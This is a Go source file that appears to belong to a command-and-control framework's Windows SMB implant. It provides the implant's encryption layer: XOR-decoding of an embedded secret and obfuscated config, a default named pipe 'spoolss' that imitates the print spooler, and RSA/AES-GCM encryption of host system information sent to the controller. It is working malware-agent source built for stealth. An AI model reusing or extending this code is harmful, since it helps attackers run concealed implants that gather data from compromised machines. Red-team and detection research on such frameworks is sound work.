// server/docker/payloads/SMB_Windows/encryption.go
// Encryption utilities for SMB agent

//go:build windows
// +build windows

package main

import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
)

// xorDecrypt decrypts a base64-encoded XOR-encrypted string using the given key
// This matches the pattern used by HTTPS agents for runtime decryption
func xorDecrypt(encoded, key string) (string, error) {
	if encoded == "" || key == "" {
		return "", fmt.Errorf(Err(E1))
	}

	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	result := make([]byte, len(decoded))
	keyBytes := []byte(key)
	for i := 0; i < len(decoded); i++ {
		result[i] = decoded[i] ^ keyBytes[i%len(keyBytes)]
	}

	return string(result), nil
}

// decryptConfig decrypts the embedded configuration
// First decrypts the secret using xorKey, then uses the decrypted secret to decrypt the config
func decryptConfig(encrypted string) (map[string]string, error) {
	// First, decrypt the secret using xorKey (same pattern as HTTPS agent)
	decryptedSecret := secret
	if xorKey != "" && secret != "" {
		var err error
		decryptedSecret, err = xorDecrypt(secret, xorKey)
		if err != nil {
			return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
		}
	}

	if encrypted == "" {
		// Return defaults for testing/development
		return map[string]string{
			"Pipe Name":  "spoolss",
			"Secret":     decryptedSecret,
			"Public Key": "",
		}, nil
	}

	// The config is XOR encrypted with the decrypted secret
	// Decode from base64
	encBytes, err := base64.StdEncoding.DecodeString(encrypted)
	if err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// XOR decrypt using the decrypted secret
	secretBytes := []byte(decryptedSecret)
	decrypted := make([]byte, len(encBytes))
	for i, b := range encBytes {
		decrypted[i] = b ^ secretBytes[i%len(secretBytes)]
	}

	// Parse JSON
	var config map[string]string
	if err := json.Unmarshal(decrypted, &config); err != nil {
		return nil, fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	return config, nil
}

// encryptHandshakePayload encrypts the system info for the handshake
func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret string) (string, error) {
	// Marshal system info to JSON
	sysInfoJSON, err := json.Marshal(sysInfo)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Parse RSA public key
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return "", fmt.Errorf(Err(E18))
	}

	pubKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Generate random AES key
	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Encrypt AES key with RSA
	encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, aesKey, nil)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	// Encrypt system info with AES-GCM
	block2, err := aes.NewCipher(aesKey)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	gcm, err := cipher.NewGCM(block2)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf(ErrCtx(E19, err.Error()))
	}

	encryptedData := gcm.Seal(nonce, nonce, sysInfoJSON, nil)

	// Create envelope
	envelope := struct {
		EncryptedKey  string `json:"encrypted_key"`
		EncryptedData string `json:"encrypted_data"`
	}{
		EncryptedKey:  base64.StdEncoding.EncodeToString(encryptedKey),
		EncryptedData: base64.StdEncoding.EncodeToString(encryptedData),
	}

	envelopeJSON, err := json.Marshal(envelope)
	if err != nil {
		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	return base64.StdEncoding.EncodeToString(envelopeJSON), nil
}

// verifyServerSignature verifies the server's RSA signature
func verifyServerSignature(resp *SignedResponse, publicKeyPEM string) error {
	// Parse public key
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return fmt.Errorf(Err(E18))
	}

	pubKey, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Recreate verification data
	verificationData := fmt.Sprintf("%s:%s", resp.NewClientID, resp.Seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Decode signature
	signature, err := base64.StdEncoding.DecodeString(resp.Signature)
	if err != nil {
		return fmt.Errorf(ErrCtx(E18, err.Error()))
	}

	// Verify signature
	if err := rsa.VerifyPKCS1v15(pubKey, crypto.SHA256, hashed[:], signature); err != nil {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	return nil
}

// generateInitialSecrets generates the initial secrets from the init secret and seed
// Must match the server's algorithm in server/internal/agent/listeners/encryption.go
func generateInitialSecrets(initSecret, seed string) (string, string) {
	// Use HMAC with seed as key (matches server implementation)
	h1 := hmac.New(sha256.New, []byte(seed))
	h1.Write([]byte(initSecret))
	secret2 := fmt.Sprintf("%x", h1.Sum(nil))

	h2 := hmac.New(sha256.New, []byte(seed))
	h2.Write([]byte(secret2))
	secret1 := fmt.Sprintf("%x", h2.Sum(nil))

	return secret1, secret2
}
